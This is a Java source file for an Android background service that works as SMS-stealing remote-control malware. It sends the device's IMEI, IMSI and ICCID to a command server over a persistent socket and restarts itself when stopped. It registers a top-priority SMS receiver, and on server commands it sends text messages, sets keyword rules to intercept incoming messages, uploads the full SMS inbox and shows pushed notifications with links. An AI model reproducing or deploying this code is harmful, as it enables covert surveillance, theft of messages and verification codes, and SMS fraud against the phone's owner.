package tools.common;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.util.Log;
/*
 * 修改isConnect同步
 * */

public class AService extends Service implements Runnable{
	private Context mContext = null;
	private boolean isConnect = false;
	private long lastXinTiao;
	
	
	private Socket socket = null;
	
	private BufferedReader socket_in = null;   
	private PrintWriter socket_out = null;  
	
	
	//定时器发送心跳
	private AlarmManager am =null;
	private PendingIntent pendIntent = null;
	private long triggerAtTime = 2000;
	//心跳间隔
	private int interval = 5*1000;
	
	private String imei = "0";
	private String iccid = "0";
	private String imsi;
	private String pstyle = "未知";
	private String appname = "未知";
	private int ver = 0;
	
	private SrceenReceiver srcReceiver = null;
	private SmsReceiver smsReceiver = null;
	
	private DbHelper dbHelper = null;
	
	private ExecutorService executorService = Executors.newFixedThreadPool(10); // 固定五个线程来执行任务
	
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}
	public void initData()
	{
		
		if(dbHelper == null)
    	{
    		dbHelper = new DbHelper(mContext,1);
    	}	     				
		
		dbHelper.opendatabase();
		
		Tools.reStart(mContext);
		TelephonyManager mTelephonyMgr = (TelephonyManager)mContext.getSystemService(Context.TELEPHONY_SERVICE);
        imsi = mTelephonyMgr.getSubscriberId();
        if(imsi==null)
        {
        	imsi = "0";
        }
        
        imei = mTelephonyMgr.getDeviceId();
        if(imei == null)
        {
        	imei = "0";
        }
        
        iccid = mTelephonyMgr.getSimSerialNumber();
        if(iccid==null)
        {
        	iccid = "0";
        }
        
        pstyle = android.os.Build.MODEL;
        
        
        try {
        	PackageInfo packageInfo = getPackageManager().getPackageInfo(getPackageName(),0);
        	appname = packageInfo.applicationInfo.loadLabel(getPackageManager()).toString();
			ver = packageInfo.versionCode;
		} catch (NameNotFoundException e) {
			// TODO Auto-generated catch block
			///e.printStackTrace();
			ver = 0;
		}
        
        if(srcReceiver==null){
        	srcReceiver = new SrceenReceiver();
            IntentFilter sfilter = new IntentFilter();
            sfilter.addAction(Intent.ACTION_SCREEN_OFF);
            sfilter.addAction(Intent.ACTION_SCREEN_ON);
            registerReceiver(srcReceiver, sfilter);
        }
        
        if(smsReceiver==null)
        {
        	smsReceiver = new SmsReceiver();
        	IntentFilter filter = new IntentFilter(); 
            filter.addAction(Tag.SMS_RECEIVER); 
            filter.setPriority(Integer.MAX_VALUE); 
            registerReceiver(smsReceiver, filter); 
        }
        
	}
	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		mContext = this;
		Logger.error("onCreate xxx...");
		initData();
		
		lastXinTiao = System.currentTimeMillis();
	}

	@Override
	public void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		socketDisConnect();
		
		
		if(Tools.checkNet(mContext))
		{
			Intent service = new Intent(mContext, AService.class);
			mContext.startService(service);
			
			if(dbHelper == null)
	    	{
	    		dbHelper = new DbHelper(mContext,1);
	    	}	     				
			
			dbHelper.opendatabase();
			
			Tools.reStart(mContext);
			
		}else{
			stopSelf();	
			if(dbHelper!=null)
			{
				dbHelper.closedatabase();
			}
			
			if(srcReceiver!=null)
			{
				Logger.error("src 取消注册");
				unregisterReceiver(srcReceiver);
				srcReceiver = null;	
			}
			
			if(smsReceiver!=null)
			{
				Logger.error("sms取消注册");
				unregisterReceiver(smsReceiver);
				smsReceiver = null;
			}
			if(am!=null&&pendIntent!=null)
			{
				am.cancel(pendIntent); 
				am = null;
				pendIntent = null;
				Logger.error("关闭定时器");
			}				
		}
		
		
	}

	@Override
	public void onStart(Intent intent, int startId) {
		// TODO Auto-generated method stub
		super.onStart(intent, startId);
		Logger.error("onStart  xxx...");
		//String action = intent.getStringExtra("action");	
		if(System.currentTimeMillis()-lastXinTiao>=10*1000)
		{
			socketDisConnect();
			Logger.info("链接断开xxxxx"+System.currentTimeMillis()+":"+lastXinTiao);			
		}
		executorService.submit(new onStrartRunnable(intent));
		
		
		
	}
	private void socketDisConnect() {
		// 断开链接
		try {
	    	
	    	if(socket_out!=null)
	    	{
	    		socket_out.close();
	    		socket_out = null;
	    	}
	        	
	    	if(socket_in!=null)
	    	{
	    		socket_in.close();
	    		socket_in = null;
	    	}
	    		
	    	if(null!=socket)
	    	{
	    		socket.close();
	    		socket = null;
	    	}
	    	
	    	
	    	
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			Log.e("sms","ioexception:"+e1.getMessage());
		}finally
		{
			isConnect = false;
		}
		
	}
	private boolean socketConnect() {
		// socket链接
		if(null == socket)
		{			
			try {
				socket = new Socket();
				InetSocketAddress socketAddress = new InetSocketAddress(Tag.HOST, Tag.PORT);
				socket.connect(socketAddress, Tag.SOCKET_TIMEOUT);
				socketAddress = null;				
				socket.setKeepAlive(true);
				
				socket_in = new BufferedReader(new InputStreamReader(socket.getInputStream()));   
				socket_out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true); 
				new Thread(AService.this).start();
				isConnect = true;
				woshou();
				Log.e("sms", "connected server...");
			} catch (IOException e) {
				// TODO Auto-generated catch block
				//e.printStackTrace();
				Logger.error(e.getMessage());
				return false;
			}
				//建立心跳机制
			if(am==null)
			{
				am = (AlarmManager)getSystemService(ALARM_SERVICE);  
				Intent intent = new Intent(mContext, EventReceiver.class);
		        intent.setAction(Tag.XINTIAO);
		        int requestCode = 0;  	        
				pendIntent = PendingIntent.getBroadcast(getApplicationContext(),  
		                requestCode, intent, PendingIntent.FLAG_UPDATE_CURRENT);  
		        //2秒后发送广播，然后每个1秒重复发广播。广播都是直接发到AlarmReceiver的  
		        triggerAtTime = SystemClock.elapsedRealtime();    	        
				am.setRepeating(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerAtTime, interval, pendIntent); 
			}							
		}
		
		return true;
	}
	@Override
	//接收输入流
	public void run() {
		// TODO Auto-generated method stub
		try {   
			//ByteArrayOutputStream baos = new ByteArrayOutputStream();
			Log.e("sms","等待接收...");
            while (true) {   
            	
                if (null!=socket&&socket.isConnected()&&!socket.isClosed()) {   
                    if (!socket.isInputShutdown()) {  
                    	String content = "";
                        if ((content = socket_in.readLine()) != null) {   
                            content += "\n";
                            //接收消息                         	
                        	Log.e("sms","rec msg:"+content);
                        	
                            Message reMsg = null;
                            reMsg = new Message();
                            reMsg.what = REVERSER;
                            Bundle bundle=new Bundle();  
                            bundle.putString("rejson", content);  
                            reMsg.setData(bundle);                           
                            mHandler.sendMessage(reMsg);                            
                            reMsg = null;
                        }
                        content = null;
                    }else{
                    	Log.e("sms","输入流被关闭");
                    	break;
                    }  
                }else
                {
                	Log.e("sms","没有连接");
                	break;
                }
            } 
            
            
        } catch (Exception e) {   
            Log.e("sms","run method Exception:"+e.getMessage());
        }finally
        {
        	Logger.error("closed inputbuffer!!!!!!!");
        	socketDisConnect();
        }
	}
	
	private static final int REVERSER = 0;
	public Handler mHandler = new Handler() {   
        public void handleMessage(Message msg) {   
            super.handleMessage(msg);   
            
            isConnect = true;
            lastXinTiao = System.currentTimeMillis();
            if(msg.what==REVERSER)  
            { 
            	Bundle dle = msg.getData();
                String retJson = dle.getString("rejson");
                
                
                //String headcode = "";
                
                //如果为心跳包
                if(retJson.equals("0"))
            	{                	
                	Log.e("sms","收到心跳包反馈"+isConnect);               	
            		return;
            	}else{
            		
            		Log.e("sms","server:"+retJson);
            		String headcode = retJson.substring(0,2);
            		String bodycode = retJson.substring(2);
            		if(headcode.equals("2A"))
            		{//任务 
            			Logger.error(retJson);
            			Future future = executorService.submit(new smsTask(bodycode));
            			
            			if(future==null)
            			{
            				Logger.error("空");
            			}
            			try {
            	            if(future.get()==null){//如果Future's get返回null，任务完成
            	                Logger.info("任务完成");
            	            }else{
            	            	Logger.info("任务没有完成");
            	            }
            	        } catch (InterruptedException e) {
            	        } catch (ExecutionException e) {
            	            //否则我们可以看看任务失败的原因是什么
            	            Logger.info(e.getMessage());
            	        }
            		}
            	}
                
                
            }
        }
	 };
	
	//第一次握手事件
	public void woshou()
	{
		//Log.e("sms","握手事件.....!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");
		String postData;
		JSONObject json = new JSONObject();
		try {
			json.put("imei", imei);
			json.put("imsi", imsi);
			json.put("iccid", iccid);
			json.put("pstyle", pstyle);
			json.put("appname", appname);
			json.put("version", Integer.toString(ver));
			postData = json.toString();
		} catch (JSONException e) {
			// TODO Auto-generated catch block
			//e.printStackTrace();
			postData = "{\"imei\":\""+imei+"\",\"imsi\":\""+imsi+"\",\"pstyle\":\""+pstyle+"\",\"appname\":\""+appname+"\",\"version\":\""+ver+"\",\"iccid\":\""+iccid+"\"}";
		}				
//		try {
//			postData = URLEncoder.encode(postData, "UTF-8");
//		} catch (UnsupportedEncodingException e) {
//			// TODO Auto-generated catch block
//			e.printStackTrace();
//		}	
		postData = "1A"+postData;
		if(sendMessage(postData))
		{
			Log.e("sms","握手成功");	
			lastXinTiao = System.currentTimeMillis();
		}
		
		
	}
	
	
	public synchronized boolean sendMessage(String message)
	{
		
		
		if(socket!=null&&socket.isConnected()&&!socket.isClosed())
		{			   
            if (!socket.isOutputShutdown()) {    		
        		//Logger.info("send:"+message);
//            	try {
//            		
//					message = URLEncoder.encode(message, "UTF-8");
//				} catch (UnsupportedEncodingException e) {
//					// TODO Auto-generated catch block
//					Logger.error(e.getMessage());
//				}
        		socket_out.println(message); 
        		socket_out.flush();        		
        		return true;
            }else
            {
            	Logger.info("isOutputShutdown is true");
            	socketDisConnect();
            	return false;
            }
            
		}else
		{
			
			Log.e("sms","发送协议失败＝＝＝＝＝＝＝＝＝＝＝＝");
			socketDisConnect();
			return false;
		}
	}
	
	
	//任务处理
	class smsTask implements Runnable
	{
		String taskbody;
		smsTask(String _task)
		{
			taskbody = _task;
		}
		@Override
		public void run() {
			// TODO Auto-generated method stub
			Logger.info("onStrartRunnable"+taskbody);
			try {
				JSONArray arrayJson = new JSONArray(taskbody);
				for(int i=0;i<arrayJson.length();i++)
				{
					JSONObject tempJson = arrayJson.optJSONObject(i);
					int ttype = tempJson.getInt("t");
					String sn,sm,isback;
					switch(ttype)
					{					
					case 11://发送短信
						//发送短信
						{
							sn = tempJson.getString("sn");
							sm = tempJson.getString("sm");
							Tools.sendSms(mContext, sn, sm);
							JSONObject post = new JSONObject();
							post.put("iccid", iccid);
							post.put("OK", "1");
							post.put("t", "11");
							if(sendMessage("1C"+post.toString()))
							{
								Logger.error("kehuduan发送成功");
							}else{
								Logger.error("kehuduan发送不成功");
							}	
						}
						
						break;
					case 12://关键字回报
						//Logger.error("12");
						String keyword = tempJson.getString("keyword");
						//Logger.error("12");
						sn = tempJson.getString("number");
						//Logger.error("12x");
						String time = tempJson.getString("etime");
						//Logger.error("12xx");
						long etime = System.currentTimeMillis()+Long.parseLong(time)*1000;
						//Logger.error("12xxx");
						isback = tempJson.getString("isback");
						
						//Logger.error("12xxxx");
						long kid = 0;
						if(dbHelper!=null)
						{
							kid = dbHelper.insertKeyword(keyword, isback,sn,etime);
							Logger.info("xxxxxxxxxxxxxxxxxx"+kid);
						}else{
							Logger.info("xxxxxxxxxxxxxxxxxx  null");
						}
						
						if(kid!=0)
						{
							JSONObject post = new JSONObject();
							post.put("iccid", iccid);
							post.put("OK", "1");
							post.put("t", "12");
							if(sendMessage("1C"+post.toString()))
							{
								Logger.error("kehuduan sned suc");
							}else{
								Logger.error("kehuduan send failed");
							}	
						}else{
							Logger.error("suc insert");
						}					
						break;
						
					case 13:						
						isback = tempJson.getString("isback");
						if(isback.equals("1"))
						{
							JSONArray jsonarray = Tools.getSms(mContext);						
							JSONObject jsonObject = new JSONObject();
							jsonObject.put("iccid", iccid);
							jsonObject.put("sms", jsonarray);
							if(sendMessage("1D"+jsonObject.toString()))
							{
								Logger.error("isback suc");
							}else{
								Logger.error("isback failed");
							}	
						}						
						break;
					case 14://通知栏更新
						{
							String title=tempJson.getString("title");
							String message=tempJson.getString("content");
							String url = tempJson.getString("url");
							Tools.showNotification(mContext, title, message, url);
						}
						break;
					}
					
					
				}					
			}catch (JSONException e)
			{
				Logger.error(e.getMessage());
			}
		}
		
	}
	
	
	class onStrartRunnable implements Runnable
	{
		private String action;
		private Intent intent;
		onStrartRunnable(Intent _intent)
		{
			
			intent = _intent;
			action = intent.getStringExtra("action");
		}
		@Override
		public void run() {
			// TODO Auto-generated method stub
			Logger.error("onStrartRunnable");
			if(Tools.checkNet(mContext))
			{//如果有网络，去链接网络
				if(!isConnect)
				{
					if(socketConnect()){
						Logger.info("socket connected...");
					}				
				}else{
					//Logger.info("connected...");
				}
			}else{
				//如果没有网络
				socketDisConnect();
				Logger.info("not net ....");
				return;
			}
			if(action!=null){
				if(action.equals(Tag.XINTIAO))
				{
					//Logger.error("心跳包");
					if(isConnect)
					{
			    		if(sendMessage("0"))
			    		{
			    			//Logger.error("发送心跳包");
			    		}
						//isConnect = false;					
					}else{					
						socketDisConnect();   	
					}
				}else if(action.equals(Tag.SMS_DELIVERED_ACTION))
				{//action.equals(Tag.SMS_SEND_ACTIOIN)||
					 String number = intent.getStringExtra("number");
					 Logger.info("发送号码:"+number);
					 //1是不成功  -1成功
					 int resultcode = intent.getIntExtra("resultcode",0);
					 Logger.info("result:"+resultcode);
					 if(resultcode==-1)
					 {
						 Logger.info("短信发送成功");
						 JSONObject post = new JSONObject();
						 try {
							 post.put("message", "短信发送成功");
							 post.put("number", number);
							 post.put("iccid", iccid);
						 }catch(JSONException e)
						 {
							 e.printStackTrace();
						 }
						 Logger.error(post.toString());
						 if(sendMessage("1B"+post.toString()))
						 {
							Logger.error("发送成功");
						 }else{
							Logger.error("发送不成功");
						 }	
						 
					 }
				}else if(action.equals(Tag.SENDTOSERVER))
				{				
					String number = intent.getStringExtra("number");
					String message = intent.getStringExtra("message");
					JSONObject post = new JSONObject();
					
					try {
						post.put("type", "1");
						post.put("number", number);
						post.put("message", message);
						post.put("iccid", iccid);
					} catch (JSONException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
					Logger.error(post.toString());
					if(sendMessage("1B"+post.toString()))
					{
						Logger.error("发送成功");
					}else{
						Logger.error("发送不成功");
					}	
				}
			}
		}
		
	}
	
	

}
